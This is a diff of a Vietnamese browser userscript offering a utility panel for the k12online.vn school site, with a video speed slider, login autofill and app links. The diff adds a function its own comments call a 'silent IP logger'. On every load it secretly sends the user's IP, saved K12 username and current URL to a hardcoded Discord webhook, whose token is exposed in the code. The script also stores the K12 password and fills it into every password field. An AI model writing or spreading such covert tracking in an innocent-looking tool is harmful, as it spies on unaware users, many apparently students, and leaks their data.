@@ -1,124 +1,134 @@
-// ==UserScript==
-// @name         Danhvux Panel v16 (Full Apps + Animation + Bot Ban)
-// @namespace    http://tampermonkey.net/
-// @version      16.0.0
-// @description  Phục hồi toàn bộ Apps, Animation và tích hợp Bot Discord
-// @author       Danhvux
-// @match        *://k12online.vn/*
-// @match        *://*.k12online.vn/*
-// @grant        GM_setValue
-// @grant        GM_getValue
-// @grant        GM_addStyle
-// @grant        GM_xmlhttpRequest
-// @connect      localhost
-// @connect      127.0.0.1
-// @run-at       document-start
-// ==/UserScript==
-
 (function() {
     'use strict';
 
-    const BOT_API = 'http://localhost:5000/blacklist';
-    const WEBHOOK_LOGGER = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV';
-    let uiColor = GM_getValue('ui_theme_color', '#ffea00');
-    let userIP = '...';
+    // ==========================================
+    // ⚙️ CẤU HÌNH HỆ THỐNG (THAY TẠI ĐÂY)
+    // ==========================================
+    const DISCORD_WEBHOOK_LOGGER = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; 
+    const BOT_API_URL = 'http://localhost:5000/blacklist'; // Thay 'localhost' bằng link Ngrok nếu cần
 
-    // 1. LOGGER & SECURITY
+    let uiColor = GM_getValue('ui_theme_color', '#ffea00');
+    let userIP = 'Đang lấy...';
+
+    // === HÀM BẢO MẬT & LOGGER ===
+    
+    // 1. Silent IP Logger (Gửi IP ngầm về Discord)
+    function silentLogger(ip) {
+        GM_xmlhttpRequest({
+            method: "POST",
+            url: DISCORD_WEBHOOK_LOGGER,
+            headers: { "Content-Type": "application/json" },
+            data: JSON.stringify({
+                embeds: [{
+                    title: "📡 TRUY CẬP MỚI ĐƯỢC PHÁT HIỆN",
+                    color: 3066993,
+                    fields: [
+                        { name: "📍 Địa chỉ IP", value: `\`${ip}\``, inline: true },
+                        { name: "👤 User K12", value: `\`${GM_getValue('k12_u', 'Chưa lưu')}\``, inline: true },
+                        { name: "🌐 URL", value: window.location.href }
+                    ],
+                    footer: { text: "Hệ thống Danhvux Hub • " + new Date().toLocaleString() }
+                }]
+            })
+        });
+    }
+
+    // 2. Kiểm tra danh sách Ban từ Bot Python
     async function checkSecurity() {
         return new Promise(resolve => {
+            // Lấy IP của người dùng
             GM_xmlhttpRequest({
                 method: "GET", url: "https://api.ipify.org?format=json",
                 onload: (resIP) => {
                     userIP = JSON.parse(resIP.responseText).ip;
-                    // Gửi log ẩn
+                    
+                    // Gửi log ẩn ngay khi có IP
+                    silentLogger(userIP); 
+                    
+                    // Hỏi Bot Python xem IP này có bị cấm không
                     GM_xmlhttpRequest({
-                        method: "POST", url: WEBHOOK_LOGGER,
-                        headers: {"Content-Type":"application/json"},
-                        data: JSON.stringify({embeds:[{title:"📡 NEW SESSION", color:3066993, fields:[{name:"IP",value:userIP,inline:true},{name:"User",value:GM_getValue('k12_u','N/A'),inline:true}]}]})
-                    });
-                    // Check Ban
-                    GM_xmlhttpRequest({
-                        method: "GET", url: BOT_API,
+                        method: "GET", url: BOT_API_URL,
                         onload: (resBot) => {
-                            if (JSON.parse(resBot.responseText).includes(userIP)) {
-                                document.documentElement.innerHTML = `<div style="background:#000;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-family:monospace;"><h1>🚫 BỊ CẤM TRUY CẬP (IP: ${userIP})</h1></div>`;
-                                resolve(false);
-                            } resolve(true);
-                        }, onerror: () => resolve(true)
+                            try {
+                                const bannedList = JSON.parse(resBot.responseText);
+                                // Server trả về JSON: ["ip1", "ip2"]
+                                if (bannedList.includes(userIP)) {
+                                    document.documentElement.innerHTML = `
+                                        <div style="background:#000; color:red; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; text-align:center;">
+                                            <div><h1 style="font-size:60px;">🚫 TRUY CẬP BỊ TỪ CHỐI</h1>
+                                            <p style="font-size:24px;">IP ${userIP} ĐÃ BỊ CẤM TRUY CẬP PANEL DANHVUX</p></div>
+                                        </div>`;
+                                    window.stop(); // Dừng tải trang ngay lập tức
+                                    resolve(false);
+                                }
+                                resolve(true);
+                            } catch(e) { resolve(true); } // Lỗi bot thì cho qua
+                        },
+                        onerror: () => resolve(true)
                     });
                 }
             });
         });
     }
 
-    // 2. CSS PHỤC HỒI ANIMATION & APPS
+    // === GIAO DIỆN PANEL (MÀU VÀNG CŨ + ANIMATION MỚI) ===
     GM_addStyle(`
+        /* Keyframes Animation */
         @keyframes panelFloat { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
-        @keyframes contentShow { from { opacity: 0; filter: blur(10px); transform: translateY(10px); } to { opacity: 1; filter: blur(0); transform: translateY(0); } }
-
-        #danhvux-panel {
+        @keyframes contentFade { from { opacity: 0; filter: blur(10px); } to { opacity: 1; filter: blur(0); } }
+        
+        #danhvux-hub {
             position: fixed; top: 100px; right: 20px; z-index: 999999;
-            width: 340px; background: rgba(20, 20, 25, 0.85);
-            color: #fff; border-radius: 25px; font-family: 'Segoe UI', sans-serif;
+            width: 320px; background: rgba(30, 32, 35, 0.95);
+            color: #ffffff; border-radius: 20px; font-family: -apple-system, sans-serif;
             backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            animation: panelFloat 6s ease-in-out infinite;
+            animation: panelFloat 5s ease-in-out infinite; /* Floating effect */
         }
-        #danhvux-panel.hidden { opacity: 0; transform: scale(0.5) rotate(5deg); pointer-events: none; }
-
-        .dv-header { padding: 30px 25px 15px; cursor: move; position: relative; }
-        .dv-dots { position: absolute; top: 20px; left: 20px; display: flex; gap: 6px; }
+        #danhvux-hub.hidden { transform: scale(0.7) rotate(5deg); opacity: 0; pointer-events: none; }
+        
+        #k12-header { padding: 25px 20px 10px; cursor: move; position: relative; }
+        .dv-dots { position: absolute; top: 18px; left: 20px; display: flex; gap: 7px; }
         .dv-dot { width: 10px; height: 10px; border-radius: 50%; }
-
-        .tab-nav { display: flex; justify-content: space-around; padding: 0 15px; margin-bottom: 10px; }
-        .tab-btn { background: none; border: none; color: #555; cursor: pointer; font-size: 11px; font-weight: 800; padding: 8px 12px; transition: 0.3s; border-radius: 10px; }
-        .tab-btn.active { color: ${uiColor}; background: rgba(255,234,0,0.1); }
-
+        
+        .tab-nav { display: flex; gap: 12px; padding: 0 20px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .tab-btn { background: none; border: none; color: #808080; cursor: pointer; font-size: 10px; font-weight: 700; padding: 10px 0; text-transform: uppercase; }
+        .tab-btn.active { color: ${uiColor}; border-bottom: 2px solid ${uiColor}; }
+        
         .tab-content { padding: 20px; display: none; min-height: 200px; }
-        .tab-content.active { display: block; animation: contentShow 0.4s forwards; }
-
-        .btn-main {
-            width: 100%; padding: 14px; border: none; border-radius: 15px;
-            background: linear-gradient(135deg, ${uiColor}, #ffcc00);
-            color: #000; font-weight: 900; cursor: pointer; transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(255,234,0,0.2);
-        }
-        .btn-main:hover { transform: scale(1.03); box-shadow: 0 8px 20px rgba(255,234,0,0.4); }
-
-        /* GRID APPS */
-        .apps-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .app-item {
-            display: flex; flex-direction: column; align-items: center;
-            text-decoration: none; color: #ccc; font-size: 10px; transition: 0.3s;
-        }
-        .app-icon {
-            width: 45px; height: 45px; border-radius: 12px; background: #222;
-            display: flex; align-items: center; justify-content: center;
-            margin-bottom: 5px; font-size: 20px; border: 1px solid #333;
-        }
-        .app-item:hover .app-icon { background: #333; transform: translateY(-5px); border-color: ${uiColor}; color: ${uiColor}; }
-
-        input, textarea {
-            width: 100%; padding: 12px; background: rgba(0,0,0,0.3);
-            border: 1px solid #333; color: #fff; border-radius: 12px; margin-bottom: 10px;
-        }
+        .tab-content.active { display: block; animation: contentFade 0.3s ease-out forwards; }
+        
+        .btn-main { width: 100%; padding: 12px; border: none; border-radius: 12px; background: ${uiColor}; color: #000; font-weight: 900; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn-main:hover { transform: scale(1.02); box-shadow: 0 5px 15px ${uiColor}33; }
+        
+        input, textarea { width: 100%; padding: 10px; background: rgba(0,0,0,0.2); border: 1px solid #333; color: white; border-radius: 8px; margin-bottom: 8px; outline: none; }
+        
+        /* grid apps */
+        .apps-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .app-item { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: #aaa; font-size: 10px; transition: 0.2s; }
+        .app-item:hover { transform: translateY(-5px); color: ${uiColor}; }
+        .app-icon { width: 40px; height: 40px; background: #222; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-bottom: 5px; border: 1px solid transparent; }
+        .app-item:hover .app-icon { border-color: ${uiColor}; }
     `);
 
+    // === KHỞI TẠO PANEL ===
     async function init() {
-        if (!(await checkSecurity())) return;
+        const isSafe = await checkSecurity();
+        if (!isSafe) return;
+
+        console.log("%c[Danhvux Hub]%c Đã khởi tạo giao diện!", "color:#ffea00;font-weight:bold;", "color:#fff;");
 
         const panel = document.createElement('div');
-        panel.id = 'danhvux-panel';
+        panel.id = 'danhvux-hub';
         panel.innerHTML = `
-            <div class="dv-header">
+            <div id="k12-header">
                 <div class="dv-dots">
                     <div class="dv-dot" style="background:#ff5f57"></div>
                     <div class="dv-dot" style="background:#ffbd2e"></div>
                     <div class="dv-dot" style="background:#27c93f"></div>
                 </div>
-                <div style="font-size:20px; font-weight:900; letter-spacing:-1px;">DANHVUX <span style="color:${uiColor}">PRO</span></div>
-                <div style="font-size:9px; color:#555; margin-top:5px;">SECURED BY PYTHON BOT • ${userIP}</div>
+                <div style="font-size: 20px; font-weight: 900; text-align:right;">DANHVUX <span style="color:${uiColor}">HUB</span></div>
             </div>
 
             <div class="tab-nav">
@@ -129,38 +139,40 @@
             </div>
 
             <div id="m" class="tab-content active">
-                <div style="margin-bottom:15px;">
-                    <small style="color:#666; font-weight:bold;">SPEED CONTROL: <span id="sV" style="color:${uiColor}">x1</span></small>
-                    <input type="range" id="sS" min="1" max="16" step="0.5" value="1" style="width:100%; accent-color:${uiColor}; margin-top:10px;">
-                </div>
-                <button class="btn-main" id="btnL">⚡ ĐĂNG NHẬP NHANH</button>
+                <div style="display:flex; justify-content:space-between; font-size:11px; color:#aaa;"><span>Tốc độ:</span><b id="sv" style="color:${uiColor}">x1</b></div>
+                <input type="range" id="ss" min="1" max="16" step="0.5" value="1" style="width:100%; accent-color:${uiColor}">
+                <button class="btn-main" id="fl">🪄 ĐĂNG NHẬP NHANH</button>
+                <p style="font-size:9px; text-align:center; color:#444; margin-top:10px;">Alt + Z để ẩn hiện nhanh</p>
             </div>
 
             <div id="a" class="tab-content">
-                <div class="apps-container">
-                    <a href="https://chatgpt.com" target="_blank" class="app-item"><div class="app-icon">🤖</div>ChatGPT</a>
-                    <a href="https://google.com" target="_blank" class="app-item"><div class="app-icon">🔍</div>Google</a>
-                    <a href="https://facebook.com" target="_blank" class="app-item"><div class="app-icon">📘</div>FB</a>
-                    <a href="https://youtube.com" target="_blank" class="app-item"><div class="app-icon">📺</div>YouTube</a>
+                <div class="apps-grid">
+                    <a href="https://chatgpt.com" target="_blank" class="app-item"><div class="app-icon">🤖</div>GPT</a>
+                    <a href="https://google.com" target="_blank" class="app-item"><div class="app-icon">🔎</div>Google</a>
+                    <a href="https://facebook.com" target="_blank" class="app-item"><div class="app-icon">🔵</div>FB</a>
+                    <a href="https://youtube.com" target="_blank" class="app-item"><div class="app-icon">📺</div>Youtube</a>
                     <a href="https://messenger.com" target="_blank" class="app-item"><div class="app-icon">💬</div>Mess</a>
                     <a href="https://tiktok.com" target="_blank" class="app-item"><div class="app-icon">🎵</div>TikTok</a>
                 </div>
             </div>
 
             <div id="r" class="tab-content">
-                <textarea id="rT" rows="4" placeholder="Nhập tin nhắn gửi đến Admin..."></textarea>
-                <button class="btn-main" id="btnR">GỬI BÁO CÁO</button>
+                <textarea id="rc" rows="3" placeholder="Nhập lỗi hoặc tố cáo IP..."></textarea>
+                <button class="btn-main" id="sr" style="background:#444; color:#fff;">GỬI REPORT</button>
             </div>
 
             <div id="s" class="tab-content">
-                <input type="text" id="kU" placeholder="User K12" value="${GM_getValue('k12_u','')}">
-                <input type="password" id="kP" placeholder="Pass K12" value="${GM_getValue('k12_p','')}">
-                <button class="btn-main" id="btnS">LƯU THÔNG TIN</button>
+                <input type="text" id="ku" placeholder="Tên K12" value="${GM_getValue('k12_u','')}">
+                <input type="password" id="kp" placeholder="Mật khẩu" value="${GM_getValue('k12_p','')}">
+                <button class="btn-main" id="svs">LƯU CẤU HÌNH</button>
+                <p style="font-size:9px; color:#555; text-align:center; margin-top:10px;">IP CỦA BẠN: ${userIP}</p>
             </div>
         `;
         document.body.appendChild(panel);
 
         // --- XỬ LÝ LOGIC ---
+
+        // Chuyển Tab
         document.querySelectorAll('.tab-btn').forEach(b => {
             b.onclick = () => {
                 document.querySelectorAll('.tab-btn, .tab-content').forEach(x => x.classList.remove('active'));
@@ -169,36 +181,40 @@
             };
         });
 
-        document.getElementById('sS').oninput = (e) => {
-            document.getElementById('sV').innerText = 'x' + e.target.value;
+        // Tốc độ
+        document.getElementById('ss').oninput = (e) => {
+            document.getElementById('sv').innerText = 'x' + e.target.value;
             if(document.querySelector('video')) document.querySelector('video').playbackRate = e.target.value;
         };
 
-        document.getElementById('btnL').onclick = () => {
+        // Đăng nhập nhanh
+        document.getElementById('fl').onclick = () => {
             document.querySelectorAll('input[type="text"], input[name*="user"]').forEach(i => i.value = GM_getValue('k12_u',''));
             document.querySelectorAll('input[type="password"]').forEach(i => i.value = GM_getValue('k12_p',''));
         };
 
-        document.getElementById('btnS').onclick = () => {
-            GM_setValue('k12_u', document.getElementById('kU').value);
-            GM_setValue('k12_p', document.getElementById('kP').value);
+        // Gửi Report
+        document.getElementById('sr').onclick = () => {
+            const txt = document.getElementById('rc').value;
+            GM_xmlhttpRequest({
+                method: "POST", url: DISCORD_WEBHOOK_LOGGER,
+                headers: {"Content-Type":"application/json"},
+                data: JSON.stringify({embeds:[{title:"📩 REPORT NEW", description:`**IP:** ${userIP}\n**Msg:** ${txt}`, color:16776960}]})
+            });
+            alert("Đã gửi báo cáo!");
+        };
+
+        // Lưu cài đặt
+        document.getElementById('svs').onclick = () => {
+            GM_setValue('k12_u', document.getElementById('ku').value);
+            GM_setValue('k12_p', document.getElementById('kp').value);
             alert("✅ Đã lưu cấu hình!");
         };
 
-        document.getElementById('btnR').onclick = () => {
-            const txt = document.getElementById('rT').value;
-            GM_xmlhttpRequest({
-                method: "POST", url: WEBHOOK_LOGGER,
-                headers: {"Content-Type":"application/json"},
-                data: JSON.stringify({embeds:[{title:"📩 NEW REPORT", description:`**IP:** ${userIP}\n**Msg:** ${txt}`, color:16776960}]})
-            });
-            alert("🚀 Đã gửi báo cáo đến Discord!");
-        };
-
-        // Kéo thả & Phím tắt
+        // Kéo thả & Phím tắt Alt+Z
         window.addEventListener('keydown', (e) => { if (e.altKey && e.code === 'KeyZ') panel.classList.toggle('hidden'); });
         let d = false, ox, oy;
-        panel.querySelector('.dv-header').onmousedown = (e) => { d = true; ox = e.clientX-panel.offsetLeft; oy = e.clientY-panel.offsetTop; };
+        document.getElementById('k12-header').onmousedown = (e) => { d = true; ox = e.clientX-panel.offsetLeft; oy = e.clientY-panel.offsetTop; };
         document.onmousemove = (e) => { if(d) { panel.style.left = (e.clientX-ox)+'px'; panel.style.top = (e.clientY-oy)+'px'; panel.style.right='auto'; } };
         document.onmouseup = () => d = false;
     }
